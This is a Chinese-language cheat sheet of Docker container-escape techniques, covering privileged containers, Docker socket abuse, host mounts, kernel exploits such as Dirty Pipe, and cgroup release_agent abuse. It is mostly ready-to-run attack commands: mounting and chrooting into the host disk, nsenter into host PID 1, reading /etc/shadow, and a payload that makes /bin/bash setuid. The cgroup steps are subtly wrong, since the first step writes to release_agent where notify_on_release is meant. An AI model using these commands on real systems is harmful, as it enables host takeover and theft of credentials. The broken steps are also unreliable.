# docke逃逸
1. 特权模式容器逃逸 (Privileged Mode Escape)​​
这是最经典且高效的逃逸方式。当容器以 --privileged 标志运行时，容器内的 root 用户几乎拥有宿主机 root 的权限。
检测方法：

```
# 方法一：检查设备文件
ls /dev/sda* 2>/dev/null
# 如果能看到宿主机磁盘设备，极可能是特权容器

# 方法二：检查能力集
cat /proc/self/status | grep CapEff
# 特权容器的 CapEff 值通常是 0000003fffffffff 或类似的全能力集

# 方法三：使用 capsh 工具
capsh --print | grep -i bounding
# 输出包含大量能力（如 CAP_SYS_ADMIN）则可能是特权容器
```


逃逸方法：​

```
# 直接挂载宿主机根文件系统
mkdir /tmp/host_root
mount /dev/sda1 /tmp/host_root  # 或 /dev/vda1, /dev/xvda1 等
chroot /tmp/host_root bash

# 如果找不到磁盘设备，可以尝试枚举
fdisk -l 2>/dev/null || lsblk 2>/dev/null

```

2. 滥用 Docker Socket 逃逸
如果容器内可以访问 Docker Socket (/var/run/docker.sock)，可以直接在容器内控制宿主机 Docker 守护进程。
检测方法:

```
# 检查 Docker Socket
ls -la /var/run/docker.sock 2>/dev/null

# 检查 Docker 命令行工具
which docker 2>/dev/null
```
逃逸方法:
```
# 方法一：在容器内启动新容器，挂载宿主机根目录
docker run -it -v /:/host ubuntu:latest chroot /host bash

# 方法二：直接启动特权容器
docker run -it --privileged --pid=host ubuntu:latest nsenter -t 1 -m -u -n -i bash
```
---

3. 挂载点逃逸
如果启动时挂载了敏感目录，如宿主机根目录
检测方法:

```
# 检查当前挂载点
mount | grep -E '(/|/host|/rootfs|/mnt)'

# 检查 Docker 启动命令
cat /proc/1/mountinfo | grep -E '(/|/host)'
```
逃逸方法:

```
# 如果发现宿主机目录被挂载到 /host
chroot /host bash

# 或者直接访问文件
cat /host/etc/shadow
```

---

4. 内核漏洞利用
Docker 与宿主机共享内核，因此内核漏洞会影响容器安全

```
相关漏洞：​​

​CVE-2022-0847 (Dirty Pipe)​​：Linux 内核漏洞，允许覆盖任意只读文件。
​CVE-2022-2586​：nft_object UAF 漏洞。
​CVE-2021-22555​：Netfilter 堆溢出漏洞。
​CVE-2016-5195 (Dirty COW)​​：经典的内核竞争条件漏洞。
```

检测:

```
# 1. 检查内核版本
uname -a

# 2. 搜索可用漏洞
searchsploit dirty pipe  # 或根据内核版本搜索

# 3. 下载和编译漏洞利用程序
# 例如 Dirty Pipe (CVE-2022-0847)
gcc exp.c -o exp && ./exp /root/.ssh/authorized_keys
```

---

5. 滥用 CGroup 通知功能
利用条件：​​ 容器须以特定能力运行，且 cgroup 可写。

逃逸方法：

```
# 1. 在受控 cgroup 中启用 notify_on_release
echo 1 > /sys/fs/cgroup/memory/release_agent

# 2. 设置 release_agent 路径为宿主机上的脚本
echo '#!/bin/sh' > /tmp/payload.sh
echo 'chmod 4755 /bin/bash' >> /tmp/payload.sh  # 或任何命令
chmod +x /tmp/payload.sh

# 3. 设置 release_agent 指向该脚本（注意宿主机路径）
echo '/tmp/payload.sh' > /sys/fs/cgroup/memory/release_agent

# 4. 触发释放过程
echo $$ > /sys/fs/cgroup/memory/cgroup.procs
```


---

​6. 其他逃逸技术​
​滥用 SYS_PTRACE 能力​：调试其他进程获取信息。
​滥用 IPC 命名空间​：通过共享内存与宿进程交互。
​滥用网络配置​：如果使用主机网络模式 (--net=host)，直接访问宿主机服务